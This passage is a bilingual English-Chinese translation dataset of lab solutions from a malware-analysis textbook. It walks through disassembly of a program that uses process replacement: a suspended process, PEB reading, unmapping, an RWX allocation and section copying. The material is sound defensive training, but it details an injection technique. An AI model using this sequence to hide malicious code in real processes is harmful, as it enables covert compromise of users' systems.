    分析 *Lab12-01.dll* 时，我们看到它除了创建一个线程外，几乎没有做其他事情，该线程随后又创建了一个新的线程。清单 12-5L 中的代码来自第一个线程，一个每分钟（0xEA60
    毫秒）创建一个线程的循环。
- en: 10001046 mov ecx, [ebp+var_18]
  id: totrans-3587
  prefs: []
  type: TYPE_NORMAL
  zh: 10001046 mov ecx, [ebp+var_18]
- en: 10001049 push ecx
  id: totrans-3588
  prefs: []
  type: TYPE_NORMAL
  zh: 10001049 push ecx
- en: 1000104A push offset Format ; "Practical Malware Analysis %d"
  id: totrans-3589
  prefs: []
  type: TYPE_NORMAL
  zh: 1000104A push offset Format ; "Practical Malware Analysis %d"
- en: 1000104F lea edx, [ebp+Parameter]
  id: totrans-3590
  prefs: []
  type: TYPE_NORMAL
  zh: 1000104F lea edx, [ebp+Parameter]
- en: 10001052 push edx ; Dest
  id: totrans-3591
  prefs: []
  type: TYPE_NORMAL
  zh: 10001052 push edx ; 目标
- en: 10001053 call _sprintf 
  id: totrans-3592
  prefs: []
  type: TYPE_NORMAL
  zh: 10001053 call _sprintf 
- en: 10001058 add esp, 0Ch
  id: totrans-3593
  prefs: []
  type: TYPE_NORMAL
  zh: 10001058 add esp, 0Ch
- en: 1000105B push 0 ; lpThreadId 1000105D push 0 ; dwCreationFlags 1000105F lea
    eax, [ebp+Parameter]
  id: totrans-3594
  prefs: []
  type: TYPE_NORMAL
  zh: 1000105B push 0 ; lpThreadId 1000105D push 0 ; dwCreationFlags 1000105F lea
    eax, [ebp+Parameter]
- en: 10001062 push eax ; lpParameter 10001063 push offset **StartAddress**  ;
  id: totrans-3595
  prefs: []
  type: TYPE_NORMAL
  zh: 10001062 push eax ; lpParameter 10001063 push offset **StartAddress**  ;
- en: lpStartAddress
  id: totrans-3596
  prefs: []
  type: TYPE_NORMAL
  zh: lpStartAddress
- en: 10001068 push 0 ; dwStackSize 1000106A push 0 ; lpThreadAttributes 1000106C
    call ds:**CreateThread**
  id: totrans-3597
  prefs: []
  type: TYPE_NORMAL
  zh: 10001068 push 0 ; dwStackSize 1000106A push 0 ; lpThreadAttributes 1000106C
    call ds:**CreateThread**
- en: Solutions to Labs
  id: totrans-3598
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**589**'
  id: totrans-3599
  prefs: []
  type: TYPE_NORMAL
  zh: '**589**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3600
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 10001072 push 0EA60h ; dwMilliseconds 10001077 call ds:**Sleep**
  id: totrans-3601
  prefs: []
  type: TYPE_NORMAL
  zh: 10001072 push 0EA60h ; dwMilliseconds 10001077 call ds:**Sleep**
- en: 1000107D mov ecx, [ebp+**var_18**]
  id: totrans-3602
  prefs: []
  type: TYPE_NORMAL
  zh: 1000107D mov ecx, [ebp+**var_18**]
- en: 10001080 add ecx, 1 
  id: totrans-3603
  prefs: []
  type: TYPE_NORMAL
  zh: 10001080 add ecx, 1 
- en: 10001083 mov [ebp+var_18], ecx
  id: totrans-3604
  prefs: []
  type: TYPE_NORMAL
  zh: 10001083 mov [ebp+var_18], ecx
- en: '*Listing 12-5L: Analyzing the thread created by* Lab12-01.dll'
  id: totrans-3605
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 12-5L：分析由 Lab12-01.dll 创建的线程*'
- en: The new thread at , labeled StartAddress by IDA Pro, creates the message box
    that says “Press OK to reboot,” and takes a parameter for the title of the box
    that is set by the sprintf at . This parameter is the format string
  id: totrans-3606
  prefs: []
  type: TYPE_NORMAL
  zh: 新创建的线程在处，由 IDA Pro 标记为 StartAddress，创建了一个显示“按 OK 重新启动”的消息框，并接受一个参数，该参数由处的
    sprintf 设置，作为框的标题。此参数是格式化字符串
- en: '"Practical Malware Analysis %d", where %d is replaced with a counter stored
    in var_18 that increments at . We conclude that this DLL does nothing other than
    produce annoying message boxes that increment by one every minute.'
  id: totrans-3607
  prefs: []
  type: TYPE_NORMAL
  zh: '"Practical Malware Analysis %d"，其中 %d 被存储在 var_18 中的计数器替换，该计数器在处递增。我们得出结论，这个
    DLL 除了每分钟递增一次的烦人消息框之外，没有做其他任何事情。'
- en: '**Lab 12-2 Solutions**'
  id: totrans-3608
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 12-2 解决方案**'
- en: '***Short Answers***'
  id: totrans-3609
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-3610
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The purpose of this program is to covertly launch another program.
  id: totrans-3611
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序的目的是在暗中启动另一个程序。
- en: 2\.
  id: totrans-3612
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The program uses process replacement to hide execution.
  id: totrans-3613
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序使用进程替换来隐藏执行。
- en: 3\.
  id: totrans-3614
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The malicious payload is stored in the program’s resource section. The resource
    has type UNICODE and the name LOCALIZATION.
  id: totrans-3615
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意有效载荷存储在程序的资源部分。该资源类型为 UNICODE，名称为 LOCALIZATION。
- en: 4\.
  id: totrans-3616
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malicious payload stored in the program’s resource section is XOR-encoded.
    This decode routine can be found at sub_40132C. The XOR byte is found at 0x0040141B.
  id: totrans-3617
  prefs: []
  type: TYPE_NORMAL
  zh: 存储在程序资源部分的恶意有效载荷是 XOR 编码的。此解码例程可以在 sub_40132C 中找到。XOR 字节位于 0x0040141B。
- en: 5\.
  id: totrans-3618
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The strings are XOR-encoded using the function at sub_401000\.
  id: totrans-3619
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 sub_401000 函数对字符串进行 XOR 编码。
- en: '***Detailed Analysis***'
  id: totrans-3620
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Since we’ve already analyzed this binary in the labs for Chapter 3, let’s begin
    by opening the file with IDA Pro and looking at the function imports. Many functions
    in the list provide little information because they are commonly imported by all
    Windows executables, but a few stand out. Specifically, CreateProcessA, GetThreadContext,
    and SetThreadContext indicate that this program creates new processes and is modifying
    the execution context of processes. The imports ReadProcessMemory and WriteProcessMemory
    tell us that the program is reading and writing directly to process memory spaces.
    The imports LockResource and SizeOfResource tell us where data important to the
    process may be stored. We’ll focus first on the purpose of the CreateProcessA
    function call found at location 0x0040115F, as shown in Listing 12-6L.
  id: totrans-3621
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们已经在第 3 章的实验室中分析了这个二进制文件，让我们首先使用 IDA Pro 打开文件并查看函数导入。列表中的许多函数提供的信息很少，因为它们被所有
    Windows 可执行文件普遍导入，但有一些突出。具体来说，CreateProcessA、GetThreadContext 和 SetThreadContext
    表明该程序创建新进程并修改进程的执行上下文。导入 ReadProcessMemory 和 WriteProcessMemory 告诉我们程序正在直接读写进程内存空间。导入
    LockResource 和 SizeOfResource 告诉我们数据可能存储的位置，这些数据对进程很重要。我们将首先关注位于 0x0040115F 的
    CreateProcessA 函数调用的目的，如列出 12-6L 所示。
- en: 00401145 lea edx, [ebp+ProcessInformation]
  id: totrans-3622
  prefs: []
  type: TYPE_NORMAL
  zh: 00401145 lea edx, [ebp+ProcessInformation]
- en: 00401148 push edx  ; lpProcessInformation 00401149 lea eax, [ebp+StartupInfo]
  id: totrans-3623
  prefs: []
  type: TYPE_NORMAL
  zh: 00401148 push edx  ; lpProcessInformation 00401149 lea eax, [ebp+StartupInfo]
- en: 0040114C push eax ; lpStartupInfo 0040114D push 0 ; lpCurrentDirectory 0040114F
    push 0 ; lpEnvironment 00401151 push 4  ;
  id: totrans-3624
  prefs: []
  type: TYPE_NORMAL
  zh: 0040114C push eax ; lpStartupInfo 0040114D push 0 ; lpCurrentDirectory 0040114F
    push 0 ; lpEnvironment 00401151 push 4  ;
- en: dwCreationFlags
  id: totrans-3625
  prefs: []
  type: TYPE_NORMAL
  zh: dwCreationFlags
- en: '**590**'
  id: totrans-3626
  prefs: []
  type: TYPE_NORMAL
  zh: '**590**'
- en: Appendix C
  id: totrans-3627
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3628
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 132](index-624_1.png)'
  id: totrans-3629
  prefs: []
  type: TYPE_IMG
  zh: '![Image 132](index-624_1.png)'
- en: 00401153 push 0 ; bInheritHandles 00401155 push 0 ; lpThreadAttributes 00401157
    push 0 ; lpProcessAttributes 00401159 push 0 ; lpCommandLine 0040115B mov ecx,
    [ebp+lpApplicationName]
  id: totrans-3630
  prefs: []
  type: TYPE_NORMAL
  zh: 00401153 push 0 ; bInheritHandles 00401155 push 0 ; lpThreadAttributes 00401157
    push 0 ; lpProcessAttributes 00401159 push 0 ; lpCommandLine 0040115B mov ecx,
    [ebp+lpApplicationName]
- en: 0040115E push ecx ; lpApplicationName 0040115F call ds:**CreateProcessA**
  id: totrans-3631
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115E push ecx ; lpApplicationName 0040115F call ds:**CreateProcessA**
- en: '...'
  id: totrans-3632
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401191 mov ecx, [ebp+ProcessInformation.hThread]
  id: totrans-3633
  prefs: []
  type: TYPE_NORMAL
  zh: 00401191 mov ecx, [ebp+ProcessInformation.hThread]
- en: 00401194 push ecx ; hThread 00401195 call ds:GetThreadContext 
  id: totrans-3634
  prefs: []
  type: TYPE_NORMAL
  zh: 00401194 push ecx ; hThread 00401195 call ds:GetThreadContext 
- en: '*Listing 12-6L: Creating a suspended process and accessing the main thread’s
    context* At  in Listing 12-6L, we see a push 4, which IDA Pro labels as the parameter
    dwCreationFlags. The MSDN documentation for CreateProcess tells us that this is
    the CREATE_SUSPENDED flag, which allows the process to be created but not started.
    The process will not execute until the main process thread is started via the
    ResumeThread API.'
  id: totrans-3635
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-6L：创建挂起进程并访问主线程的上下文* 在列出 12-6L 的  处，我们看到一个 push 4，IDA Pro 将其标记为参数 dwCreationFlags。MSDN
    文档中关于 CreateProcess 的说明告诉我们，这是一个 CREATE_SUSPENDED 标志，允许创建进程但不启动。进程将不会执行，直到通过 ResumeThread
    API 启动主进程线程。'
- en: At , we see the program accessing the context of a thread. The hThread parameter
    for GetThreadContext comes from the same buffer passed to CreateProcessA at ,
    which tells us that the program is accessing the context of the suspended thread.
    Obtaining the thread handle is important because the program will use the thread
    handle to interact with the suspended process.
  id: totrans-3636
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处，我们看到程序正在访问线程的上下文。GetThreadContext 的 hThread 参数来自与  处传递给 CreateProcessA
    的相同缓冲区，这告诉我们程序正在访问挂起线程的上下文。获取线程句柄很重要，因为程序将使用线程句柄与挂起进程交互。
- en: '**1 2**'
  id: totrans-3637
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: After the call to GetThreadContext, we see the context used in a call to ReadProcessMemory.
    To better determine what the program is doing with the context, we need to add
    the CONTEXT structure in IDA Pro. To add this standard structure, click the **Structures**
    tab and press the INS key. Next, click the **Add Standard Structure** button and
    locate the structure named CONTEXT.
  id: totrans-3638
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 GetThreadContext 之后，我们看到上下文被用于 ReadProcessMemory 的调用中。为了更好地确定程序如何使用上下文，我们需要在
    IDA Pro 中添加 CONTEXT 结构。要添加此标准结构，请点击 **Structures** 选项卡并按 INS 键。然后，点击 **Add Standard
    Structure** 按钮，找到名为 CONTEXT 的结构。
- en: Once you’ve added the structure, right-click location 0x004011C3 to allow the
    resolution of the structure offset, as shown in Figure 12-2L. As you can see,
    the offset 0xA4 actually references the EBX register of the thread by the [eax+CONTEXT._Ebx].
  id: totrans-3639
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦添加了结构，右键单击位置 0x004011C3 以允许解析结构偏移，如图 12-2L 所示。如图所示，偏移 0xA4 实际上通过 [eax+CONTEXT._Ebx]
    引用了线程的 EBX 寄存器。
- en: '*Figure 12-2L: IDA Pro structure offset resolution*'
  id: totrans-3640
  prefs: []
  type: TYPE_NORMAL
  zh: '*图12-2L：IDA Pro结构偏移解析*'
- en: The EBX register of a suspended newly created process always contains a pointer
    to the Process Environment Block (PEB) data structure. As shown in Listing 12-7L,
    at , the program increments the PEB data structure by 8 bytes and pushes the
    value onto the stack as the start address for the memory read.
  id: totrans-3641
  prefs: []
  type: TYPE_NORMAL
  zh: 新创建的挂起进程的EBX寄存器始终包含指向进程环境块（PEB）数据结构的指针。如列表12-7L所示，在处，程序将PEB数据结构增加8字节，并将该值推入栈中作为内存读取的起始地址。
- en: Solutions to Labs
  id: totrans-3642
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**591**'
  id: totrans-3643
  prefs: []
  type: TYPE_NORMAL
  zh: '**591**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3644
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004011B8 push 0 ; lpNumberOfBytesRead 004011BA push 4  ;
  id: totrans-3645
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B8 push 0 ; lpNumberOfBytesRead 004011BA push 4  ;
- en: nSize
  id: totrans-3646
  prefs: []
  type: TYPE_NORMAL
  zh: nSize
- en: 004011BC lea edx, [ebp+Buffer]
  id: totrans-3647
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BC lea edx, [ebp+Buffer]
- en: 004011BF push edx ; lpBuffer 004011C0 mov eax, [ebp+lpContext]
  id: totrans-3648
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BF push edx ; lpBuffer 004011C0 mov eax, [ebp+lpContext]
- en: 004011C3 mov ecx, [eax+CONTEXT._Ebx]
  id: totrans-3649
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C3 mov ecx, [eax+CONTEXT._Ebx]
- en: 004011C9 add ecx, 8 
  id: totrans-3650
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C9 add ecx, 8 
- en: 004011CC push ecx ; lpBaseAddress 004011CD mov edx, [ebp+ProcessInformation.hProcess]
  id: totrans-3651
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CC push ecx ; lpBaseAddress 004011CD mov edx, [ebp+ProcessInformation.hProcess]
- en: 004011D0 push edx ; hProcess 004011D1 call ds:**ReadProcessMemory**
  id: totrans-3652
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 push edx ; hProcess 004011D1 call ds:**ReadProcessMemory**
- en: '*Listing 12-7L: Reading a PEB data structure*'
  id: totrans-3653
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-7L：读取PEB数据结构*'
- en: 'Because the PEB data structure is not part of the standard IDA Pro data structures,
    we can use an Internet search or WinDbg to help determine what is at offset 8
    of the PEB data structure: a pointer to the ImageBaseAddress or the start of the
    loaded executable. Passing this address as the read location and reading 4 bytes
    at , we see that what IDA Pro has labeled Buffer will contain the ImageBase of
    the suspended process.'
  id: totrans-3654
  prefs: []
  type: TYPE_NORMAL
  zh: 因为PEB数据结构不是IDA Pro标准数据结构的一部分，我们可以使用网络搜索或WinDbg来帮助确定PEB数据结构偏移8处的值：指向ImageBaseAddress或加载的可执行文件的起始地址。将此地址作为读取位置，读取处的4个字节，我们看到IDA
    Pro标记为Buffer的部分将包含挂起进程的ImageBase。
- en: The program manually resolves the import UnMapViewOfSection using GetProcAddress
    at 0x004011E8, and at 0x004011FE, the ImageBaseAddress is a parameter of UnMapViewOfSection.
    The call to UnMapViewOfSection removes the suspended process from memory, at which
    point the program can no longer execute.
  id: totrans-3655
  prefs: []
  type: TYPE_NORMAL
  zh: 程序使用GetProcAddress在0x004011E8处手动解析导入的UnMapViewOfSection，在0x004011FE处，ImageBaseAddress是UnMapViewOfSection的参数。调用UnMapViewOfSection将从内存中移除挂起的进程，此时程序将无法执行。
- en: In Listing 12-8L, we see the parameters pushed onto the stack for a call to
    VirtualAllocEx.
  id: totrans-3656
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表12-8L中，我们看到推入栈中的参数用于调用VirtualAllocEx。
- en: 00401209 push 40h ; flProtect 0040120B push 3000h ; flAllocationType 00401210
    mov edx, [ebp+var_8]
  id: totrans-3657
  prefs: []
  type: TYPE_NORMAL
  zh: 00401209 push 40h ; flProtect 0040120B push 3000h ; flAllocationType 00401210
    mov edx, [ebp+var_8]
- en: 00401213 mov eax, [edx+50h]
  id: totrans-3658
  prefs: []
  type: TYPE_NORMAL
  zh: 00401213 mov eax, [edx+50h]
- en: 00401216 push eax ; dwSize 00401217 mov ecx, [ebp+var_8]
  id: totrans-3659
  prefs: []
  type: TYPE_NORMAL
  zh: 00401216 push eax ; dwSize 00401217 mov ecx, [ebp+var_8]
- en: 0040121A mov edx, [ecx+34h]
  id: totrans-3660
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121A mov edx, [ecx+34h]
- en: 0040121D push edx ; lpAddress 0040121E mov eax, [ebp+ProcessInformation.hProcess]
  id: totrans-3661
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121D push edx ; lpAddress 0040121E mov eax, [ebp+ProcessInformation.hProcess]
- en: 00401221 push eax ; hProcess 00401222 call ds:VirtualAllocEx
  id: totrans-3662
  prefs: []
  type: TYPE_NORMAL
  zh: 00401221 push eax ; hProcess 00401222 call ds:VirtualAllocEx
- en: '*Listing 12-8L: Allocating memory for an executable within a suspended process*
    Notice that this listing shows the program allocating memory within the suspended
    processes address space, at . This is behavior that requires further investigation.'
  id: totrans-3663
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-8L：在挂起进程中分配执行内存* 注意，此列表显示程序在挂起进程的地址空间内分配内存，在处。这是需要进一步调查的行为。'
- en: At the beginning of the function, the program checks for the MZ magic value
    at 0x004010FE and a PE magic value at 0x00401119\. If the checks are valid, we
    know that var_8 contains a pointer to the PE header loaded in memory.
  id: totrans-3664
  prefs: []
  type: TYPE_NORMAL
  zh: 函数开始时，程序检查0x004010FE处的MZ魔数值和0x00401119处的PE魔数值。如果检查有效，我们知道var_8包含指向内存中加载的PE头的指针。
- en: At , the program requests that the memory be allocated at the address of the
    ImageBase of the buffer-based PE file, which tells the Windows loader **592**
  id: totrans-3665
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，程序请求在基于缓冲区的PE文件的ImageBase地址处分配内存，这告诉Windows加载器**592**
- en: Appendix C
  id: totrans-3666
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3667
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: where the executable would prefer to be loaded into memory. At , the program
    requests the size of memory specified by the PE header value ImageSize (offset
    0x50). Finally, at , we use the MSDN documentation to determine that the memory
    is being allocated with PAGE_EXECUTE_READWRITE permissions.
  id: totrans-3668
  prefs: []
  type: TYPE_NORMAL
  zh: 在内存中加载可执行文件的位置。在处，程序请求由PE头中的ImageSize值指定的内存大小（偏移量为0x50）。最后，在处，我们使用MSDN文档来确定内存是以PAGE_EXECUTE_READWRITE权限分配的。
- en: Once the memory has been allocated, a WriteProcessMemory at 0x00401251
  id: totrans-3669
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦内存已分配，0x00401251处的WriteProcessMemory
- en: writes data from the beginning of the PE file into the memory just allocated
    within the suspended process. The number of bytes written is taken from offset
    0x54 of the PE header, SizeOfHeaders. This first WriteProcessMemory copies the
    PE file headers into the suspended process, which suggests that this program is
    moving a PE file into another process’s address space.
  id: totrans-3670
  prefs: []
  type: TYPE_NORMAL
  zh: 将PE文件从开始写入挂起进程内刚分配的内存。写入的字节数来自PE头的0x54偏移量，SizeOfHeaders。这个第一个WriteProcessMemory将PE文件头复制到挂起的进程中，这表明这个程序正在将PE文件移动到另一个进程的地址空间。
- en: Next, in Listing 12-9L, we see a loop at  where the loop counter var_70
  id: totrans-3671
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，在列表12-9L中，我们看到处的循环，循环计数器var_70
- en: is initialized to 0 at 0x00401257\.
  id: totrans-3672
  prefs: []
  type: TYPE_NORMAL
  zh: 在0x00401257处初始化为0。
- en: 00401257 mov
  id: totrans-3673
  prefs: []
  type: TYPE_NORMAL
  zh: 00401257 mov
- en: '[ebp+var_70],'
  id: totrans-3674
  prefs: []
  type: TYPE_NORMAL
  zh: '[ebp+var_70],'
- en: '0'
  id: totrans-3675
  prefs: []
  type: TYPE_NORMAL
  zh: '0'
- en: 0040125E jmp
  id: totrans-3676
  prefs: []
  type: TYPE_NORMAL
  zh: 0040125E jmp
- en: short
  id: totrans-3677
  prefs: []
  type: TYPE_NORMAL
  zh: short
- en: loc_401269
  id: totrans-3678
  prefs: []
  type: TYPE_NORMAL
  zh: loc_401269
- en: '00401260 loc_401260:'
  id: totrans-3679
  prefs: []
  type: TYPE_NORMAL
  zh: '00401260 loc_401260:'
- en: '; CODE XREF: sub_4010EA+1CD_j'
  id: totrans-3680
  prefs: []
  type: TYPE_NORMAL
  zh: '; CODE XREF: sub_4010EA+1CD_j'
- en: 00401260 mov eax, [ebp+var_70]
  id: totrans-3681
  prefs: []
  type: TYPE_NORMAL
  zh: 00401260 mov eax, [ebp+var_70]
- en: 00401263 add eax, 1
  id: totrans-3682
  prefs: []
  type: TYPE_NORMAL
  zh: 00401263 add eax, 1
- en: 00401266 mov [ebp+var_70], eax
  id: totrans-3683
  prefs: []
  type: TYPE_NORMAL
  zh: 00401266 mov [ebp+var_70], eax
- en: 00401269
  id: totrans-3684
  prefs: []
  type: TYPE_NORMAL
  zh: 00401269
- en: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
  id: totrans-3685
  prefs: []
  type: TYPE_NORMAL
  zh: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
- en: 0040126C xor edx, edx
  id: totrans-3686
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126C xor edx, edx
- en: 0040126E mov dx, [ecx+6]
  id: totrans-3687
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126E mov dx, [ecx+6]
- en: '**1 2**'
  id: totrans-3688
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: 00401272 cmp [ebp+var_70], edx 
  id: totrans-3689
  prefs: []
  type: TYPE_NORMAL
  zh: 00401272 cmp [ebp+var_70], edx 
- en: 00401275 jge short loc_4012B9
  id: totrans-3690
  prefs: []
  type: TYPE_NORMAL
  zh: 00401275 jge short loc_4012B9
- en: 00401277 mov eax, [ebp+var_4]
  id: totrans-3691
  prefs: []
  type: TYPE_NORMAL
  zh: 00401277 mov eax, [ebp+var_4]
- en: 0040127A mov ecx, [ebp+lpBuffer]
  id: totrans-3692
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127A mov ecx, [ebp+lpBuffer]
- en: 0040127D add ecx, [eax+3Ch] 
  id: totrans-3693
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127D add ecx, [eax+3Ch] 
- en: 00401280 mov edx, [ebp+var_70]
  id: totrans-3694
  prefs: []
  type: TYPE_NORMAL
  zh: 00401280 mov edx, [ebp+var_70]
- en: 00401283 imul edx, 28h 
  id: totrans-3695
  prefs: []
  type: TYPE_NORMAL
  zh: 00401283 imul edx, 28h 
- en: 00401286 lea eax, [ecx+edx+0F8h]
  id: totrans-3696
  prefs: []
  type: TYPE_NORMAL
  zh: 00401286 lea eax, [ecx+edx+0F8h]
- en: 0040128D mov [ebp+var_74], eax
  id: totrans-3697
  prefs: []
  type: TYPE_NORMAL
  zh: 0040128D mov [ebp+var_74], eax
- en: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
  id: totrans-3698
  prefs: []
  type: TYPE_NORMAL
  zh: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
- en: 00401295 mov edx, [ecx+10h]
  id: totrans-3699
  prefs: []
  type: TYPE_NORMAL
  zh: 00401295 mov edx, [ecx+10h]
- en: 00401298 push edx ; nSize 00401299 mov eax, [ebp+var_74]
  id: totrans-3700
  prefs: []
  type: TYPE_NORMAL
  zh: 00401298 push edx ; nSize 00401299 mov eax, [ebp+var_74]
- en: 0040129C mov ecx, [ebp+lpBuffer]
  id: totrans-3701
  prefs: []
  type: TYPE_NORMAL
  zh: 0040129C mov ecx, [ebp+lpBuffer]
- en: 0040129F add ecx, [eax+14h]
  id: totrans-3702
  prefs: []
  type: TYPE_NORMAL
  zh: 0040129F add ecx, [eax+14h]
- en: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
  id: totrans-3703
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A2 push ecx ; lpBuffer 004012A3 mov edx, [ebp+var_74]
- en: 004012A6 mov eax, [ebp+lpBaseAddress]
  id: totrans-3704
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A6 mov eax, [ebp+lpBaseAddress]
- en: 004012A9 add eax, [edx+0Ch]
  id: totrans-3705
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A9 add eax, [edx+0Ch]
- en: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
  id: totrans-3706
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AC push eax ; lpBaseAddress 004012AD mov ecx, [ebp+ProcessInformation.hProcess]
- en: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
  id: totrans-3707
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B0 push ecx ; hProcess 004012B1 call ds:WriteProcessMemory
- en: 004012B7 jmp short loc_401260 
  id: totrans-3708
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B7 jmp short loc_401260 
- en: '*Listing 12-9L: Copying PE sections into memory*'
  id: totrans-3709
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-9L：将PE部分复制到内存中*'
- en: Solutions to Labs
  id: totrans-3710
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**593**'
  id: totrans-3711
  prefs: []
  type: TYPE_NORMAL
  zh: '**593**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3712
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The loop counter is compared to the value at offset 6 bytes into the PE
  id: totrans-3713
  prefs: []
  type: TYPE_NORMAL
  zh: 循环计数器与PE偏移量6字节处的值进行比较
- en: header at , which is the NumberOfSections. Because executable sections contain
    the data necessary to run an executable—such as the code, data, relocations, and
    so on—we know that this loop is probably copying the PE executable sections into
    the suspended process, but let’s be sure.
  id: totrans-3714
  prefs: []
  type: TYPE_NORMAL
  zh: 在处的头信息，即NumberOfSections。因为可执行文件部分包含运行可执行文件所需的数据——例如代码、数据、重定位等——我们知道这个循环很可能是将PE可执行文件部分复制到挂起的进程中，但让我们确认一下。
- en: var_4 contains a pointer to the MZ/PE file in memory (labeled lpBuffer by IDA
    Pro), which is initialized at location 0x004010F3\. We know that the first part
    of a PE executable is an MZ header, and at , we see the program adding offset
    0x3C (offset to PE header) to the MZ header buffer, which makes ECX point to the
    beginning of the PE header. At , we see a pointer being obtained. EDX is 0 the
    first time through the loop, so we can remove EDX from the pointer calculation.
    That leaves us with ECX and 0xF8\.
  id: totrans-3715
  prefs: []
  type: TYPE_NORMAL
  zh: var_4包含指向内存中MZ/PE文件的指针（由IDA Pro标记为lpBuffer），在0x004010F3位置初始化。我们知道PE可执行文件的第一部分是MZ头，在处，我们看到程序将0x3C（PE头的偏移量）添加到MZ头缓冲区，这使得ECX指向PE头的开始。在处，我们看到获取了一个指针。EDX在循环第一次时为0，因此我们可以从指针计算中移除EDX。这留下了ECX和0xF8。
- en: Looking at the PE header offsets, we see 0xF8 is the start of the IMAGE_HEADER_SECTION
    array. A simple sizeof(IMAGE_HEADER_SECTION) tells us that this structure is 40
    bytes, which matches the multiplication performed on the loop counter at .
  id: totrans-3716
  prefs: []
  type: TYPE_NORMAL
  zh: 查看 PE 标头偏移量，我们看到 0xF8 是 IMAGE_HEADER_SECTION 数组的开始。简单的 sizeof(IMAGE_HEADER_SECTION)
    告诉我们这个结构是 40 字节，这与在  处循环计数器上执行的乘法相匹配。
- en: Now we can leverage IDA Pro standard structures again by adding in IMAGE_DOS_HEADER,
    IMAGE_NT_HEADERS, and IMAGE_SECTION_HEADER. Using the knowledge we’ve gained about
    each register at the different stages, we can transform the disassembly in Listing
    12-9L into the much more readable version in Listing 12-10L (the changes are in
    bold in this listing).
  id: totrans-3717
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以通过添加 IMAGE_DOS_HEADER、IMAGE_NT_HEADERS 和 IMAGE_SECTION_HEADER 标准结构来再次利用
    IDA Pro。利用我们在不同阶段对每个寄存器的了解，我们可以将列表 12-9L 中的反汇编代码转换为列表 12-10L 中的更易读版本（此列表中的更改以粗体显示）。
- en: '00401260 loc_401260:'
  id: totrans-3718
  prefs: []
  type: TYPE_NORMAL
  zh: '00401260 loc_401260:'
- en: '; CODE XREF: sub_4010EA+1CD_j'
  id: totrans-3719
  prefs: []
